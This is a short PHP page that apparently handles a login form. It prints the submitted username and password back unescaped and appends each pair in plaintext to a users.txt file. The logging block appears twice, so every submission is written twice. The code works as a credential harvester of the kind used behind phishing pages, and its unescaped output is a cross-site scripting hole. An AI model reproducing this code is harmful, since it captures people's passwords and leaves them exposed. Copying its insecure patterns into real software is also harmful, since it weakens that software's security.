<html>
<body>
Welcome <?php echo $_POST["uname"]; ?><br>
Your password is: <?php echo $_POST["psw"]; ?>

<?php
$output = fopen("../output/users.txt","a");
fwrite($output, $_POST["uname"]);
fwrite($output, "/");
fwrite($output, $_POST["psw"]);
fwrite($output, "\n");
fclose($output);
?>

<?php
$output = fopen("../output/users.txt","a");
fwrite($output, $_POST["uname"]);
fwrite($output, "/");
fwrite($output, $_POST["psw"]);
fwrite($output, "\n");
fclose($output);
?>
</body>
</html>